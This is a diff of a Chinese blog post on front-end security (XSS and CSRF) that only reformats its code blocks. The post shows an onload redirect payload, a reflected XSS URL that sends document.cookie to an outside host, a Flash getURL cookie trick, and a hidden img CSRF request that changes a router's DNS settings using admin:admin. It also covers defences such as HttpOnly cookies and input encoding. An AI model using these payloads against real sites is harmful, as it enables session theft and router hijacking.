@@ -17,20 +17,20 @@ title: 前端安全的那些事
 ####页面中输入DOM节点####
 
 {% highlight html %}
-&lt;img src="xxx.gif" onload="window.location.href='johnqing.github.io'"&gt;
+<img src="xxx.gif" onload="window.location.href='johnqing.github.io'">
 {% endhighlight %}
 
 ####页面中输入js脚本####
 
-<pre>
+{% highlight javascript %}
 window.location.href='johnqing.github.io'
-</pre>
+{% endhighlight %}
 
 如果用户在，用户信息等form表单中输入
 
-<pre>
+{% highlight javascript %}
 window.location.href='johnqing.github.io'
-</pre>
+{% endhighlight %}
 
 就会造成用户打开该页面就会执行自动跳转
 
@@ -38,9 +38,9 @@ window.location.href='johnqing.github.io'
 
 用户在添加表单时，可输入如下代码：
 
-<pre>
-&lt;p&gt;
-</pre>
+{% highlight html %}
+<p>
+{% endhighlight %}
 
 就可能造成页面错乱
 
@@ -50,15 +50,13 @@ window.location.href='johnqing.github.io'
 
 http://X.com/search.asp?q=ssss
 
-<pre>
-搜索结果：&lt;?php $_GET('q') ?&gt;
-</pre>
+{% highlight php %}
+搜索结果：<?php $_GET('q') ?>
+{% endhighlight %}
 
 好了，俺偷偷伪造一个请求发送给该网站
 
-<pre>
-http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.cn?cookie="+document.cookie)&lt;/script&gt;
-</pre>
+http://X.com/search.asp?q=<script>window.open("http://johnqing.github.io.cn?cookie="+document.cookie)</script>
 
 瞬间，他的cookie信息，都在这了。
 
@@ -66,9 +64,9 @@ http://X.com/search.asp?q=&lt;script&gt;window.open("http://johnqing.github.io.c
 
 当然flash作为web里一直存在的东东，当然也可以攻击。Flash中的getURL()动作，它可以使我们的页面重定向到函数指定的页面。
 
-<pre>
+{% highlight javascript %}
 getURL('javascript:alert(document.cookie)');
-</pre>
+{% endhighlight %}
 
 哈哈 cookie又在我这了。。
 
@@ -81,12 +79,12 @@ getURL('javascript:alert(document.cookie)');
 ####XSS漏洞修复####
 
 原则：不相信客户输入的数据
-注意: 攻击代码不一定在&lt;script&gt;&lt;/script&gt;中
+注意: 攻击代码不一定在<script></script>中
 
 将重要的cookie标记为http only, 这样的话Javascript 的document.cookie语句就不能获取到cookie了.
 只允许用户输入我们期望的数据。例如：年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。
 对数据进行Html Encode 处理
-过滤或移除特殊的Html标签， 例如: &lt;script&gt;, &lt;iframe&gt; ,  &lt; for &lt;, &gt; for &gt;, &quot for
+过滤或移除特殊的Html标签， 例如: <script>, <iframe> ,  < for <, > for >, &quot for
 过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。
 
 ##CSRF(伪造请求攻击)##
@@ -96,9 +94,9 @@ getURL('javascript:alert(document.cookie)');
 
 代码如下：
 
-<pre>
-&lt;img style="display: none; " src="http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=&amp;dnsserver=8.8.8.8&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6"&gt;
-</pre>
+{% highlight html %}
+<img style="display: none; " src="http://admin:admin@192.168.1.1/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&amp;ip1=192.168.1.100&amp;ip2=192.168.1.199&amp;Lease=120&amp;gateway=0.0.0.0&amp;domain=&amp;dnsserver=&amp;dnsserver=8.8.8.8&amp;dnsserver2=8.8.8.8&amp;Save=%B1%A3+%B4%E6">
+{% endhighlight %}
 
 可以想象一下，假如你访问的是你的银行账户，而且丫也支持 `GET` 请求，很容易就会被攻击者利用这种漏洞，从账户中把钱拿出来
 
